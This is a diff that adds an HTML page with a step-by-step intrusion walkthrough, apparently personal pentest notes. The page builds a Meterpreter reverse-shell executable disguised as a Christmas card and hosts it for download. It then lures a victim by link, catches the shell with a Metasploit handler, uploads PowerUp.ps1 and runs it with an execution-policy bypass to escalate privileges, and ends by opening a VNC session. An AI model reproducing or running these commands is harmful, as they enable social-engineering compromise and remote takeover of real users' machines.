@@ -1,1 +1,39 @@
-
+<a href=../index.html>Back to home</a>
+<hr/>
+<h1>VNC connection</h1>
+<h2>Create malicious file</h2>
+<p>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/myusername/Desktop/ChristmasCard.exe</p>
+<h2>Host malicious file</h2>
+<p><ol>
+<ul>mkdir /var/www/html/share</ul>
+<ul>chmod -R 755 /var/www/html/share</ul>
+<ul>chown -R www-data:www-data /var/www/html/share</ul>
+<ul>cp /home/myusername/Desktop/ChristmasCardTest.exe /var/www/html/share</ul>
+</ol></p>
+<h2>Start webserver</h2>
+<p><ol><ul>service apache2 start</ul>
+<ul>service nginx start</ul></ol></p>
+<h2>Start Metasploit</h2>
+<p><ol><ul>msfconsole</ul>
+<ul>use exploit/multi/handler</ul>
+<ul>set payload windows/meterpreter/reverse_tcp</ul>
+<ul>set LHOST [MY IP ADDRESS]</ul>
+<ul>set LPORT 444</ul>
+  <ul>exploit</ul>
+</ol></p>
+<h2>Attack</h2>
+<p>Send a link to the victim in order to open the malicious file</p>
+<h2>Meterpreter shell</h2>
+<p><ol><ul>sysinfo</ul></ol></p>
+<h2>Upload PowerUp.ps1</h2>
+<p>upload /root/PowerSploit/Privesc/PowerUp.ps1</p>
+<p>PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.</p>
+<h2>Live off the land</h2>
+<p>shell</p>
+<p>powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”</p>
+<p>Notice the space between the two dots!</p>
+<p>Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.</p>
+<p>exit</p>
+<h2>VNC</h2>
+<p>run vnc</p>
+<hr>
